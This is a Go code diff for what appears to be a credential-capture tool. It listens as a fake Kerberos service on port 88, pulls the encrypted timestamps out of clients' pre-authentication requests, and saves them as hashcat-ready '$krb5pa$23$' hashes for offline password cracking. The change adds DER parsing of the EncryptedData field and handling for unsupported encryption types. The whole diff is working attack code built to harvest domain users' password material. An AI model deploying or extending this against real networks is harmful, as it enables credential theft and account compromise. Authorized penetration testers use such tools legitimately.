@@ -46,6 +46,7 @@ func serveKerberosUDP(ifaceIP net.IP) {
 func serveKerberosTCP(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:88", ifaceIP))
 	if err != nil {
+		core.LogError("Kerberos TCP listen :88 - %v (need root?)", err)
 		return
 	}
 	for {
@@ -121,13 +122,60 @@ func handleKerberosPacket(pkt []byte, src net.Addr) {
 	}
 	for _, pad := range paData {
 		if pad.paType == 2 && len(pad.value) > 0 {
-			hash := fmt.Sprintf("$krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(pad.value))
+			etype, cipher, ok := parseEncryptedData(pad.value)
+			if !ok {
+				// Not a DER EncryptedData blob (test vector or odd client):
+				// fall back to hashing the raw value.
+				etype, cipher = 23, pad.value
+			}
+			if etype != 23 {
+				// Only RC4-HMAC (etype 23) can be expressed in the hashcat
+				// "$krb5pa$23$..." format we produce.
+				core.LogVerbose("Kerberos: PA-ENC-TIMESTAMP etype %d unsupported (only etype 23 is hashed)", etype)
+				continue
+			}
+			hash := fmt.Sprintf("$krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(cipher))
 			core.SaveCapture("Kerberos", srcStr, principal, realm, "KRB5PA", hash)
 		}
 	}
 	if len(paData) == 0 && principal != "" {
-		core.SaveCapture("Kerberos", srcStr, principal, realm, "AS-REQ", principal)
+		core.SaveCapture("Kerberos", srcStr, principal, realm, msgType, principal)
 	}
+}
+
+// parseEncryptedData decodes a DER EncryptedData (RFC 4120 §5.2.9) as found in
+// the PA-ENC-TIMESTAMP pre-auth data and returns its etype and ciphertext.
+func parseEncryptedData(data []byte) (etype int, cipher []byte, ok bool) {
+	var seq asn1.RawValue
+	if _, err := asn1.Unmarshal(data, &seq); err != nil ||
+		seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence {
+		return 0, nil, false
+	}
+	body := seq.Bytes
+	for len(body) > 0 {
+		var f asn1.RawValue
+		rest, err := asn1.Unmarshal(body, &f)
+		if err != nil {
+			break
+		}
+		body = rest
+		if f.Class != asn1.ClassContextSpecific {
+			continue
+		}
+		switch f.Tag {
+		case 0: // etype
+			var n int
+			if _, err := asn1.Unmarshal(f.Bytes, &n); err == nil {
+				etype = n
+			}
+		case 2: // cipher
+			var b []byte
+			if _, err := asn1.Unmarshal(f.Bytes, &b); err == nil {
+				cipher = b
+			}
+		}
+	}
+	return etype, cipher, len(cipher) > 0
 }
 
 type paDataEntry struct {
